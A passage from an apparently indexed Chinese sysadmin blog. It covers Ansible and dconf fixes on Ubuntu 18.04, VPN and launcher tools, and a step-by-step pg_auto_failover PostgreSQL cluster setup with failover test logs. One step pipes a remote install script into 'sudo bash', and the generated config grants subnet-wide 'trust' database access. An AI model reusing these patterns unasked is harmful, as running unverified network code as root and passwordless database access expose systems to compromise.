語法修正就好了。\n第一次碰到這狀況，也不是太難解決，不過還是簡單做個筆記好了\n不然都沒啥文章了，哈哈！\n","date":"2019-12-18T14:44:27+08:00","image":"https://h.cowbay.org/images/post-default-10.jpg","permalink":"https://h.cowbay.org/post/accidentally-typed-an-extra-space-in-ansible-playbook/","title":"[筆記] 在ansible playbook中不小心多打了一個空格 / Accidentally Typed an Extra Space in Ansible Playbook"},{"content":"這幾天在ansible 寫了一份新的playbook給developer 用\n然後user反映說，希望能在ubuntu 18.04 內建的dock 裏面新增一個gnome-terminal的icon\n我才發現原來之前的寫法不能用在 ubuntu 18.04 上\n只好又弄了一份出來\n有些task 我是直接從原本給14.04 client 用的直接套用過來\n也沒有去特別注意\n今天重新檢查才發現，舊的寫法是給 14.04 的unity用\n但是 18.04 已經不用 unity 了，所以在設定dock這個task 雖然有成功，但是沒做用 (手術成功，但病人掛了？)\n原來的寫法是在 /usr/share/glib-2.0/schemas/ 底下新增一個設定檔\n然後用dconf 去產生設定\n原本的內容長這樣\n[com.canonical.Unity.Launcher] favorites=[\u0026#39;application://ubiquity.desktop\u0026#39;, \u0026#39;application://launchers.desktop\u0026#39;, \u0026#39;application://nautilus.desktop\u0026#39;, \u0026#39;application ://gnome-terminal.desktop\u0026#39;, \u0026#39;application://google-chrome.desktop\u0026#39;, \u0026#39;application://goldendict.desktop\u0026#39;, \u0026#39;application://stardict .desktop\u0026#39;, \u0026#39;application://libreoffice-writer.desktop\u0026#39;, \u0026#39;application://libreoffice-calc.desktop\u0026#39;, \u0026#39;unity://running-apps\u0026#39;, \u0026#39;unit y://expo-icon\u0026#39;, \u0026#39;unity://devices\u0026#39;] 就如同前面所說，因爲18.04捨棄了 unity，所以這個config 等於沒有用了\n新的步驟比較麻煩一點點\n大概是\nmkdir -p /etc/dconf/profile vim /etc/dconf/profile/user #This line allows the user to change the default favorites later. user-db:user #This line defines a system database named msb system-db:msb mkdir -p /etc/dconf/db/msb.d vim /etc/dconf/db/msb.d/00_msb_settings # Define default favorite apps [org/gnome/shell] favorite-apps = [\u0026#39;chromium-browser.desktop\u0026#39;, \u0026#39;firefox.desktop\u0026#39;, \u0026#39;gnome-terminal.desktop\u0026#39;, \u0026#39;nautilus.desktop\u0026#39;] 把這些步驟改成 ansible 語法，再派送到client ，重開機之後就可以正確顯示設定好的「我的最愛」了\n","date":"2019-12-16T13:59:26+08:00","image":"https://h.cowbay.org/images/post-default-2.jpg","permalink":"https://h.cowbay.org/post/add-system-wide-favorite-apps-in-dconf/","title":"在ubuntu 18.04中，透過 dconf 設定系統層級的「我的最愛」/ Add System Wide Favorite Apps in dock with Dconf in ubuntu 18.04"},{"content":"最近上班閒得發慌，沒事就上 github 找看看有沒有什麼好玩的專案\n就不小心發現了這個 streisand\nhttps://github.com/StreisandEffect/streisand\n玩了一下，發現這根本就是終極的VPN Server solution ..\n包含了各種常見的VPN 套件，像是\nOpenConnect / Cisco AnyConnect OpenVPN Shadowsocks WireGuard 並且直接整合了幾間比較大的雲端主機服務商\nAmazon Web Services (AWS) Microsoft Azure Digital Ocean Google Compute Engine (GCE) Linode Rackspace 透過指令，可以簡單的在上述的空間建立一台新的 VPS (可惜沒有vultr)\n安裝步驟什麼的就不說了，因為整合了 ansible 所以過程很簡單\n而且在安裝完成後，會自動生成相關文件\n文件中包含了怎麼連線的方式，以及連線設定檔，甚至連 QRCODE 都幫你做好\n真的是超級方便的VPN工具！\n","date":"2019-10-14T13:59:58+08:00","permalink":"https://h.cowbay.org/post/awesome-all-in-one-vpn-server-streisand/","title":"[筆記] 超強的ALL-in-One VPN Server streisand / Awesome All in One Vpn Server Streisand"},{"content":"這兩天在找關於在 ubuntu 中做搜尋的軟體\n意外找到一個非常好用的工具 ulauncher\n官方網站： https://ulauncher.io/\n簡單的說，這東西可以讓你不需要ubuntu 的 dash 輸入關鍵字尋找 app\n舉例來說\n如果我想要啟動 libreoffice Calc\n通常我會按一下鍵盤上的 windows/super 鍵，然後輸入calc\n像是圖片中這樣\nOK ，那這樣有什麼問題呢？\n最大的問題應該是fcitx 的 bug ，在這邊不能輸入中文搜尋，如果只是要找應用程式還好\n但是要找檔案就會有問題了\n那用 ulauncher 有什麼不同呢？\n首先，因為 ulauncher 內建的呼叫快捷鍵是 ctrl+space\n跟 fcitx (對，又是他) 切換中文的快捷鍵衝突\n所以要改掉，可以改成自己喜歡的任意組合，像我就改成 ctl+ esc\n叫出ulauncher 的視窗後，直接輸入 calc 也有一樣的效果\n當然啦，如果只是這樣，那也沒什麼了不起的\nulauncher 最大的好處是他支援各式各樣的extension\n可以在網站上瀏覽這些擴充套件，最好選擇 V2.0 的，他新舊版本不相容\nhttps://ext.ulauncher.io/\n拿幾個我裝的 extension 來示範\n比如我常寫 ansible playbook\n可是又很常忘記某些模組、語法怎麼用\n所以我都要開著瀏覽器去 ansible 官網看資料\n現在我可以用 DevDocs 這個extension 直接查語法\n像是這樣\n按下enter 或者 alt+1 就可以開啟相關語法的網頁\n又或者是常常要去查 IP，也有相關的extension 可以用\n再來就是 unicode 字元查詢\n可以很簡單的複製 unicode 裡面的特殊字元\n像是狗貓牛豬\n🐕🐈🐄🐖\n房子車子孩子\n🏠🚚👦\n是不是很方便！(當然前提是平常有用到這些符號啦)\n最後是我覺得最好用的搜尋檔案\n之前在搜尋檔案的時候，都是先去點開檔案總管，然後用裡面的搜尋 (好啦，我承認其實我很少用這個功能，檔案沒有多到記不得放在哪裡) (可是 👩 說很需要\u0026hellip;.)\n不過這個功能要搭配 tracker 這個套件，我不確定 ubuntu 預設有沒有裝\n裝好之後，做一些簡單的設定，就可以直接搜尋檔案名稱了\n根本殺手級套件啊！\n強烈推薦大家一定要裝起來玩玩看！\n","date":"2019-10-04T14:12:15+08:00","permalink":"https://h.cowbay.org/post/recommended-ulauncher-in-ubuntu-1804/","title":"[推薦] ulauncher ubuntu 18.04 底下，好用的 app launcher / Recommended Ulauncher in Ubuntu 1804"},{"content":"最近都在弄postgresql\n備份、還原測試得差不多了，就等著看到時候要用什麼方式\n前幾天看到 pg_auto_failover 這個postgresql 的extension\nhttps://github.com/citusdata/pg_auto_failover\n感覺挺不錯的，看起來設定很簡單，雖然之前已經測試了 keepalived 做 HA\n不過，反正當作練功嘛，多測試一套也不錯！\n基本的邏輯是 一台 monitor , 一台 master/primary node ，一台 slave/secondary node 組成一個cluster\n官方提供的架構圖如下\n當master/primary node 上面的 postgresql 服務死掉了，slave/secondary node 會自動接手\n等到master/primary node 回來之後，會自動降級為 slave/secondary node\n而原本的 slave/secondary node 就會變成 master/primary\n安裝相關套件 以下步驟在三個node 都要操作\n安裝相依套件\nsudo apt install make libssl1.0.0 libssl-dev libkrb5-3 libkrb5-dev libpq5 libpq-dev pgdg-keyring ssl-cert postgresql-plperl-11 postgresql-pltcl-11 postgresql-plpython-11 postgresql-plpython3-11 postgresql-11 postgresql-common postgresql-server-dev-11 postgresql-client-11 postgresql-client-common postgresql-doc-11 tcl8.6 libjson-perl tcl-tclreadline 安裝完成後，切換到postgres身份，把原本系統內的postgresql 檔存放目錄還有資料庫檔案目錄都清掉\nsudo su - postgres mv /etc/postgresql/11 /etc/postgresql/11.bak mv /var/lib/postgresql/11 /var/lib/postgresql/11.bak exit 開始安裝 pg_auto_failover\ncurl https://install.citusdata.com/community/deb.sh | sudo bash sudo apt install postgresql-11-auto-failover -y postgresql 的相關執行檔路徑，預設不會載入到PATH變數中，所以要自己手動增加\n直接加入 /etc/environment ，或者是去修改使用者的 .profile 載入正確的 $PATH 都可以\n#replace PATH variable in /etc/environment PATH=\u0026#34;/usr/lib/postgresql/11/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\u0026#34; 因為要用 pg_auto_failover 來控制postgresql ，所以要把系統內建的服務先停掉，並且設定開啟不啟動\nsudo systemctl disable postgresql sudo systemctl stop postgresql 為了讓三台機器可以直接用hostname溝通，所以要修改 /etc/hosts\n#add to /etc/hosts 192.168.11.151 monitor monitor.abc.com 192.168.11.152 pg-primary pg-primary.abc.com 192.168.11.153 pg-slave pg-slave.abc.com 以上完成在三台node上，安裝postgresql/pg_auto_failover 的工作\n設定 monitor node 在monitor node操作\n建立monitor node\nsudo runuser -l postgres -c \u0026#34;/usr/bin/pg_autoctl create monitor --pgdata /var/lib/postgresql/11/main --pgport 5432 --nodename monitor\u0026#34; 這個步驟會在pg_hba.conf 中，新增一筆紀錄\nhost \u0026#34;pg_auto_failover\u0026#34; \u0026#34;autoctl_node\u0026#34; 192.168.11.0/24 trust # Auto-generated by pg_auto_failover 檢查一下狀態，看看有沒有安裝成功\n2019-09-19 06:56:09 [administrator@monitor ~]$ sudo runuser -l postgres -c \u0026#34;psql -c \u0026#39;\\\u0026#39;du\u0026#34; List of roles Role name | Attributes | Member of --------------+------------------------------------------------------------+----------- autoctl | | {} autoctl_node | | {} postgres | Superuser, Create role, Create DB, Replication, Bypass RLS | {} 2019-09-19 06:56:15 [administrator@monitor ~]$ sudo runuser -l postgres -c \u0026#34;psql -c \u0026#39;\\\u0026#39;l\u0026#34; List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges ------------------+----------+-----------+---------+-------+----------------------- pg_auto_failover | autoctl | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres (4 rows) OK，看起來沒有問題\n啟動pg_auto_failover monitor\n2019-09-19 06:56:19 [administrator@monitor ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl run --pgdata /var/lib/postgresql/11/main\u0026#34; 06:57:38 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 06:57:38 INFO PostgreSQL is running in \u0026#34;/var/lib/postgresql/11/main\u0026#34; on port 5432 06:57:38 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 06:57:38 INFO pg_auto_failover monitor is ready at postgres://autoctl_node@monitor:5432/pg_auto_failover 06:57:38 INFO Contacting the monitor to LISTEN to its events 這個指令會停留在console畫面上，要不就是在最後加上 \u0026amp; 放去背景執行\n要不就是用systemd/supervisor 來控制，這個後面再來改\n就先放著讓他跑，還可以順便觀察cluster變動時的狀態\n再開一個terminal 跑底下的指令，產生monitor node 的URI ，在建立maser/slave node 的時候會用到\n2019-09-19 06:58:39 [administrator@monitor ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl show uri --pgdata /var/lib/postgresql/11/main\u0026#34; postgres://autoctl_node@monitor:5432/pg_auto_failover 2019-09-19 06:59:01 [administrator@monitor ~]$ 以上完成monitor node 的準備工作\n設定master/primary node 建立pg_auto_failover master/primary node\n2019-09-19 15:04:16 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl create postgres --pgdata /var/lib/postgresql/11/main --pgport 5432 --nodename pg-primary --monitor postgres://autoctl_node@monitor:5432/pg_auto_failover\u0026#34; 15:04:19 INFO Found pg_ctl for PostgreSQL 11.5 at /usr/lib/postgresql/11/bin/pg_ctl 15:04:19 INFO Registered node pg-primary:5432 with id 1 in formation \u0026#34;default\u0026#34;, group 0. 15:04:19 INFO Writing keeper init state file at \u0026#34;/var/lib/postgresql/.local/share/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.init\u0026#34; 15:04:19 INFO Successfully registered as \u0026#34;single\u0026#34; to the monitor. 15:04:21 INFO Initialising a PostgreSQL cluster at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 15:04:21 INFO Postgres is not running, starting postgres 15:04:21 INFO /usr/lib/postgresql/11/bin/pg_ctl --pgdata /var/lib/postgresql/11/main --options \u0026#34;-p 5432\u0026#34; --options \u0026#34;-h *\u0026#34; --wait start 15:04:21 INFO CREATE DATABASE postgres; 15:04:21 INFO The database \u0026#34;postgres\u0026#34; already exists, skipping. 15:04:21 INFO FSM transition from \u0026#34;init\u0026#34; to \u0026#34;single\u0026#34;: Start as a single node 15:04:21 INFO Initialising postgres as a primary 15:04:21 INFO Transition complete: current state is now \u0026#34;single\u0026#34; 15:04:21 INFO Keeper has been succesfully initialized. 2019-09-19 15:04:21 [administrator@pg-primary ~]$ 啟動 pg_auto_failover master/primary node\n2019-09-19 15:14:34 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl run --pgdata /var/lib/postgresql/11/main\u0026#34; 15:15:11 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 15:15:11 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 15:15:11 INFO pg_autoctl service is starting 15:15:11 INFO Calling node_active for node default/1/0 with current state: single, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 15:15:16 INFO Calling node_active for node default/1/0 with current state: single, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 15:15:21 INFO Calling node_active for node default/1/0 with current state: single, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 一樣，執行完之後，會停留在畫面上，所以開另一個視窗來執行以下檢查的指令\n2019-09-19 15:17:08 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl show state --pgdata /var/lib/postgresql/11/main\u0026#34; Name | Port | Group | Node | Current State | Assigned State -----------+--------+-------+-------+-------------------+------------------ pg-primary | 5432 | 0 | 1 | single | single 2019-09-19 15:17:16 [administrator@pg-primary ~]$ 以上，master/primary node 設定結束\n####設定 slave/secondary node\n建立 pg_auto_failover slave/secondary node\n2019-09-19 07:04:08 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl create postgres --pgdata /var/lib/postgresql/11/main --pgport 5432 --nodename pg-slave --monitor postgres://autoctl_node@monitor:5432/pg_auto_failover\u0026#34; 07:19:57 INFO Found pg_ctl for PostgreSQL 11.5 at /usr/lib/postgresql/11/bin/pg_ctl 07:19:57 INFO Registered node pg-slave:5432 with id 2 in formation \u0026#34;default\u0026#34;, group 0. 07:19:57 INFO Writing keeper init state file at \u0026#34;/var/lib/postgresql/.local/share/pg_autoctl/var/lib/postgresql/11/main/pg_autoctl.init\u0026#34; 07:19:57 INFO Successfully registered as \u0026#34;wait_standby\u0026#34; to the monitor. 07:19:57 INFO FSM transition from \u0026#34;init\u0026#34; to \u0026#34;wait_standby\u0026#34;: Start following a primary 07:19:57 INFO Transition complete: current state is now \u0026#34;wait_standby\u0026#34; 07:20:02 INFO FSM transition from \u0026#34;wait_standby\u0026#34; to \u0026#34;catchingup\u0026#34;: The primary is now ready to accept a standby 07:20:02 INFO The primary node returned by the monitor is pg-primary:5432 07:20:02 INFO Initialising PostgreSQL as a hot standby 07:20:02 INFO Running /usr/lib/postgresql/11/bin/pg_basebackup -w -h pg-primary -p 5432 --pgdata /var/lib/postgresql/11/backup -U pgautofailover_replicator --write-recovery-conf --max-rate 100M --wal-method=stream --slot pgautofailover_standby ... 07:20:04 INFO pg_basebackup: initiating base backup, waiting for checkpoint to complete pg_basebackup: checkpoint completed pg_basebackup: write-ahead log start point: 0/2000028 on timeline 1 pg_basebackup: starting background WAL receiver 0/23751 kB (0%), 0/1 tablespace (...ostgresql/11/backup/backup_label) 13103/23751 kB (55%), 0/1 tablespace (...gresql/11/backup/base/13091/2602) 23761/23761 kB (100%), 0/1 tablespace (...esql/11/backup/global/pg_control) 23761/23761 kB (100%), 1/1 tablespace pg_basebackup: write-ahead log end point: 0/20000F8 pg_basebackup: waiting for background process to finish streaming ... pg_basebackup: base backup completed 07:20:04 INFO Postgres is not running, starting postgres 07:20:04 INFO /usr/lib/postgresql/11/bin/pg_ctl --pgdata /var/lib/postgresql/11/main --options \u0026#34;-p 5432\u0026#34; --options \u0026#34;-h *\u0026#34; --wait start 07:20:04 INFO PostgreSQL started on port 5432 07:20:04 INFO Transition complete: current state is now \u0026#34;catchingup\u0026#34; 07:20:04 INFO Keeper has been succesfully initialized. 2019-09-19 07:20:04 [administrator@pg-slave ~]$ 可以看到在建立slave/secondary node 的時候，就會開始第一次的同步\n**啟動 pg_auto_failover slave/secondary node\n2019-09-19 07:20:04 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl run --pgdata /var/lib/postgresql/11/main\u0026#34; 07:21:33 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 07:21:33 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 07:21:33 INFO pg_autoctl service is starting 07:21:33 INFO Calling node_active for node default/2/0 with current state: catchingup, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 07:21:33 INFO FSM transition from \u0026#34;catchingup\u0026#34; to \u0026#34;secondary\u0026#34;: Convinced the monitor that I\u0026#39;m up and running, and eligible for promotion again 07:21:33 INFO Transition complete: current state is now \u0026#34;secondary\u0026#34; 07:21:34 INFO Calling node_active for node default/2/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 07:21:39 INFO Calling node_active for node default/2/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 開新視窗確認狀態\n2019-09-19 07:22:03 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl show state --pgdata /var/lib/postgresql/11/main\u0026#34; Name | Port | Group | Node | Current State | Assigned State -----------+--------+-------+-------+-------------------+------------------ pg-primary | 5432 | 0 | 1 | primary | primary pg-slave | 5432 | 0 | 2 | secondary | secondary 2019-09-19 07:22:45 [administrator@pg-slave ~]$ 正常的話，應該就是會出現兩個 node ，一個 pg-primary 一個pg-slave\ngenerate URI for applications\n這個步驟是用來產生給client/applications 連線用的連線字串(connection string)\n2019-09-19 07:29:56 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl show uri --formation default --pgdata /var/lib/postgresql/11/main\u0026#34; postgres://pg-slave:5432,pg-primary:5432/postgres?target_session_attrs=read-write 2019-09-19 07:30:06 [administrator@pg-slave ~]$ 以後就都通過這個URI來存取這個cluster\n切記，不可以用系統內建的postgresql service，一定要用 pg_auto_failover 來啟動DB\n以上 slave/secondary node 設定完成\n設定上並不複雜，比起keepalived 要簡單太多了..\n那就要評估看看在異常狀況發生，切換資料庫時的表現了\n接下來就繼續測試auto failover 的功能！\n測試 auto failover 首先，在 pg-prmiary node 上，透過上面產生的URI來進入psql\n然後建立一個測試db、建立一個測試table，插入幾筆資料\n2019-09-20 10:58:21 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;psql postgres://pg-slave:5432,pg-primary:5432/postgres?target_session_attrs=read-write\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# create database testdb_1058; CREATE DATABASE postgres=# create table testtbl (serial int); CREATE TABLE postgres=# insert into testtbl values (111); INSERT 0 1 postgres=# insert into testtbl values (222); INSERT 0 1 postgres=# insert into testtbl values (3); INSERT 0 1 postgres=# insert into testtbl values (444); INSERT 0 1 postgres=# select * from testtbl; serial -------- 111 222 3 444 (4 rows) postgres=# \\q 2019-09-20 10:59:30 [administrator@pg-primary ~]$ 然後切換到 pg-slave ，一樣透過URI進入psql 撈看看資料\n2019-09-20 03:02:12 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;psql postgres://pg-slave:5432,pg-primary:5432/postgres?target_session_attrs=read-write\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# select * from testtbl; serial -------- 111 222 3 444 (4 rows) postgres=# 確認透過URI的確是可以正常的存取資料\n在兩台單機上(master/slave)上也都可以看到同樣的資料，代表資料有正確的被同步到兩台node上\npg-slave\n2019-09-20 03:03:06 [administrator@pg-slave ~]$ sudo runuser -l postgres -c psql psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+-----------+---------+-------+----------------------- nexus | postgres | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres testdb_1058 | postgres | SQL_ASCII | C | C | (5 rows) postgres=# select * from testtbl; serial -------- 111 222 3 444 (4 rows) postgres=# pg-master\n2019-09-20 10:59:30 [administrator@pg-primary ~]$ sudo runuser -l postgres -c psql psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+-----------+---------+-------+----------------------- nexus | postgres | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres testdb_1058 | postgres | SQL_ASCII | C | C | (5 rows) postgres=# select * from testtbl; serial -------- 111 222 3 444 (4 rows) postgres=# 接著來把本來是master的機器關掉，看看會有什麼變化\n首先，在pg-slave 這台機器上，就會看到cluster 有狀況，primary 不見了\n03:06:02 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 03:06:08 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 03:06:13 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 03:06:18 ERROR PostgreSQL cannot reach the primary server: the system view pg_stat_wal_receiver has no rows. 03:06:18 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 03:06:23 ERROR PostgreSQL cannot reach the primary server: the system view pg_stat_wal_receiver has no rows. 03:06:23 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 03:06:28 ERROR PostgreSQL cannot reach the primary server: the system view pg_stat_wal_receiver has no rows. 03:06:28 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 03:06:33 ERROR PostgreSQL cannot reach the primary server: the system view pg_stat_wal_receiver has no rows. 03:06:33 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 03:06:38 ERROR PostgreSQL cannot reach the primary server: the system view pg_stat_wal_receiver has no rows. 03:06:38 INFO Calling node_active for node default/4/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 這時候在pg-slave 還能不能透過URI 連線進去psql操作？\n2019-09-20 03:08:06 [administrator@pg-slave ~]$ sudo runuser -l postgres -c \u0026#34;psql postgres://pg-slave:5432,pg-primary:5432/postgres?target_session_attrs=read-write\u0026#34; psql (11.5 (Ubuntu 11.5-1.pgdg18.04+1)) Type \u0026#34;help\u0026#34; for help. postgres=# \\l List of databases Name | Owner | Encoding | Collate | Ctype | Access privileges -------------+----------+-----------+---------+-------+----------------------- nexus | postgres | SQL_ASCII | C | C | postgres | postgres | SQL_ASCII | C | C | template0 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres template1 | postgres | SQL_ASCII | C | C | =c/postgres + | | | | | postgres=CTc/postgres testdb_1058 | postgres | SQL_ASCII | C | C | (5 rows) postgres=# create database testdb_1108; CREATE DATABASE postgres=# create table testtbl_1108 (serial int); CREATE TABLE postgres=# insert into testtbl_1108 values (999); INSERT 0 1 postgres=# insert into testtbl_1108 values (888); INSERT 0 1 postgres=# insert into testtbl_1108 values (77); INSERT 0 1 postgres=# insert into testtbl_1108 values (66); INSERT 0 1 postgres=# insert into testtbl_1108 values (55); INSERT 0 1 postgres=# \\q 2019-09-20 03:09:34 [administrator@pg-slave ~]$ 很好，看起來沒有問題，這時候把 pg-primary 打開，執行啟動 pg_auto_failover node 的指令，看看會發生什麼事\n2019-09-20 11:12:13 [administrator@pg-primary ~]$ sudo runuser -l postgres -c \u0026#34;pg_autoctl run\u0026#34; 11:12:29 INFO Managing PostgreSQL installation at \u0026#34;/var/lib/postgresql/11/main\u0026#34; 11:12:29 INFO The version of extenstion \u0026#34;pgautofailover\u0026#34; is \u0026#34;1.0\u0026#34; on the monitor 11:12:29 INFO pg_autoctl service is starting 11:12:29 INFO Calling node_active for node default/1/0 with current state: primary, PostgreSQL is not running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:29 INFO Postgres is not running, starting postgres 11:12:29 INFO /usr/lib/postgresql/11/bin/pg_ctl --pgdata /var/lib/postgresql/11/main --options \u0026#34;-p 5432\u0026#34; --options \u0026#34;-h *\u0026#34; --wait start 11:12:30 WARN PostgreSQL was not running, restarted with pid 1407 11:12:30 INFO FSM transition from \u0026#34;primary\u0026#34; to \u0026#34;demoted\u0026#34;: A failover occurred, no longer primary 11:12:30 INFO Transition complete: current state is now \u0026#34;demoted\u0026#34; 11:12:30 INFO Calling node_active for node default/1/0 with current state: demoted, PostgreSQL is not running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:30 INFO FSM transition from \u0026#34;demoted\u0026#34; to \u0026#34;catchingup\u0026#34;: A new primary is available. First, try to rewind. If that fails, do a pg_basebackup. 11:12:30 INFO The primary node returned by the monitor is pg-slave:5432 11:12:30 INFO Rewinding PostgreSQL to follow new primary pg-slave:5432 11:12:30 ERROR Connection to database failed: could not connect to server: No such file or directory Is the server running locally and accepting connections on Unix domain socket \u0026#34;/var/run/postgresql/.s.PGSQL.5432\u0026#34;? 11:12:30 ERROR Failed to get the postgresql.conf path from the local postgres server, see above for details 11:12:30 WARN Failed to rewind demoted primary to standby, trying pg_basebackup instead 11:12:30 INFO Initialising PostgreSQL as a hot standby 11:12:30 INFO Target directory exists: \u0026#34;/var/lib/postgresql/11/main\u0026#34;, stopping PostgreSQL 11:12:30 INFO pg_ctl: no server running 11:12:30 INFO pg_ctl stop failed, but PostgreSQL is not running anyway 11:12:30 INFO Running /usr/lib/postgresql/11/bin/pg_basebackup -w -h pg-slave -p 5432 --pgdata /var/lib/postgresql/11/backup -U pgautofailover_replicator --write-recovery-conf --max-rate 100M --wal-method=stream --slot pgautofailover_standby ... 11:12:33 INFO pg_basebackup: initiating base backup, waiting for checkpoint to complete pg_basebackup: checkpoint completed pg_basebackup: write-ahead log start point: 0/12000028 on timeline 6 pg_basebackup: starting background WAL receiver 0/46937 kB (0%), 0/1 tablespace (...ostgresql/11/backup/backup_label) 46947/46947 kB (100%), 0/1 tablespace (...esql/11/backup/global/pg_control) 46947/46947 kB (100%), 1/1 tablespace pg_basebackup: write-ahead log end point: 0/120000F8 pg_basebackup: waiting for background process to finish streaming ... pg_basebackup: base backup completed 11:12:33 INFO Postgres is not running, starting postgres 11:12:33 INFO /usr/lib/postgresql/11/bin/pg_ctl --pgdata /var/lib/postgresql/11/main --options \u0026#34;-p 5432\u0026#34; --options \u0026#34;-h *\u0026#34; --wait start 11:12:33 INFO PostgreSQL started on port 5432 11:12:33 INFO Drop replication slot \u0026#34;pgautofailover_standby\u0026#34; 11:12:33 INFO Transition complete: current state is now \u0026#34;catchingup\u0026#34; 11:12:33 INFO Calling node_active for node default/1/0 with current state: catchingup, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:38 INFO Calling node_active for node default/1/0 with current state: catchingup, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:43 INFO Calling node_active for node default/1/0 with current state: catchingup, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:48 INFO Calling node_active for node default/1/0 with current state: catchingup, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is -1. 11:12:48 INFO FSM transition from \u0026#34;catchingup\u0026#34; to \u0026#34;secondary\u0026#34;: Convinced the monitor that I\u0026#39;m up and running, and eligible for promotion again 11:12:48 INFO Transition complete: current state is now \u0026#34;secondary\u0026#34; 11:12:48 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 11:12:53 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 11:12:58 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 11:13:03 INFO Calling node_active for node default/1/0 with current state: secondary, PostgreSQL is running, sync_state is \u0026#34;\u0026#34;, WAL delta is 0. 可以看到 pg_auto_failover 偵測到了cluster node 有意異動，開始同步資料，然後切換角色，從primary變成了 secondary\n同一時間，在pg-slave 的訊息也有變動\n03:12:34 INFO Calling node_active for node default/4/0 with current state: wait_primary, PostgreSQL is running, sync_state is \u0026#34;async\u0026#34;, WAL delta is 0. 03:12:39 INFO Calling node_active for node default/4/0 with current state: wait_primary, PostgreSQL is running, sync_state is \u0026#34;async\u0026#34;, WAL delta is 0. 03:12:45 INFO Calling node_active for node default/4/0 with current state: wait_primary, PostgreSQL is running, sync_state is \u0026#34;async\u0026#34;, WAL 